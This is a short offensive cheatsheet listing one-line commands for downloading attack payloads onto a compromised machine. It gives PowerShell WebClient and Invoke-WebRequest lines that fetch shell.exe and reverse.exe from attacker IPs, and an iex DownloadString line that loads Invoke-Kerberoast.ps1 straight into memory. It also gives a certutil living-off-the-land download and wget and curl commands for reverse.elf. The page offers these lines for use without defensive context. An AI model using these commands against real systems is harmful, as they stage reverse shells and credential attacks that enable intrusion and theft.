# Cheatsheet on downloading files with CLI

## PowerShell:

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.27.64:80/shell.exe','shell.exe')"
```

```
powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe
```

```
iex​(New-Object Net.WebClient).DownloadString('http://10.13.27.64/Invoke-Kerberoast.ps1')
```

## LOL Bins:

```
certutil -urlcache -split -f http://192.168.23.204/reverse.exe
```

## Linux:

Reference: https://gtfobins.github.io/#+file%20download

```
wget http://192.168.23.204/reverse.elf
```

```
curl http://192.168.23.204/reverse.elf -o reverse.elf
```
